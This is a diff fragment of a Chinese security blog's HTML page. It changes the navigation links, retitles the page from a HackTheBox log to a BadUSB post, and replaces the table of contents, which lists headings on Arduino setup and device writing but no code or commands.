h4eHd4KXN+nztHhXqt025C4nI/Dw8PAO8/LGVTTktLUlVu8HDw8P7wAvv4oMPeblpYqi6TW78PDw8Epe+8ieJcptySMvWLz4Lh4eHt4x3mwka1aAWKo6tyNceHh4eG/lzUav8gS6HdWKjhIPDw/vA3ht+tuOZyWrFMMHeHh4eMd4edNrHZDfLU/fL++Dh4eHd4A3a4DNSqttOWN9bAsPDw9vK+8HuZNzqJ/46U8AAAAASUVORK5CYII=' target="_blank">
         
           <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qrcode.png">
         
@@ -500,40 +484,21 @@ var _hmt = _hmt || [];
       
           <div class="prev-next">
               
-                  <section class="prev">
-                      <span class="art-item-left">
-                          <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
-                          <h4>
-                              <a href="/2020/01/29/echarts%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" rel="prev" title="echarts简单使用">
-                                
-                                    echarts简单使用
-                                
-                              </a>
-                          </h4>
-                          
-                              
-                              <h6 class="tags">
-                                  <a class="tag" href="/tags/%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> 个人学习</a>
-                              </h6>
-                          
-                      </span>
-                  </section>
-              
               
                   <section class="next">
                       <span class="art-item-right" aria-hidden="true">
                           <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
                           <h4>
-                              <a href="/2020/01/03/Peach-Fuzz%E9%92%88%E5%AF%B9%E4%BA%8E%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F/" rel="prev" title="Peach Fuzz针对于工控系统">
+                              <a href="/2020/04/14/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0-Linux/" rel="prev" title="内存取证学习-Linux">
                                   
-                                      Peach Fuzz针对于工控系统
+                                      内存取证学习-Linux
                                   
                               </a>
                           </h4>
                           
                               
                               <h6 class="tags">
-                                  <a class="tag" href="/tags/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> 工控安全</a>
+                                  <a class="tag" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> 应急响应</a>
                               </h6>
                           
                       </span>
@@ -563,7 +528,7 @@ var _hmt = _hmt || [];
 
   <script>
     window.subData = {
-      title: 'hack box 记录',
+      title: 'Badusb实际应用',
       tools: true
     }
   </script>
@@ -677,7 +642,7 @@ var _hmt = _hmt || [];
 </header>
 
     <div class='content pure'>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前期准备"><span class="toc-text">前期准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注册"><span class="toc-text">注册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用"><span class="toc-text">使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cartographer"><span class="toc-text">Cartographer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Emdee-five-for-life"><span class="toc-text">Emdee five for life</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fuzzy"><span class="toc-text">Fuzzy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lernaean"><span class="toc-text">Lernaean</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FreeLancer"><span class="toc-text">FreeLancer</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BadUSB介绍"><span class="toc-text">BadUSB介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#什么是Arduino-ide？"><span class="toc-text">什么是Arduino ide？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BadUSB应用"><span class="toc-text">BadUSB应用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#设置开发板类型"><span class="toc-text">设置开发板类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#设置设备使用的COM口"><span class="toc-text">设置设备使用的COM口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写入并测试"><span class="toc-text">写入并测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#现场情况"><span class="toc-text">现场情况</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#镜像文件"><span class="toc-text">镜像文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#转换与写入"><span class="toc-text">转换与写入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#下载地址"><span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
     </div>
   </section>
 
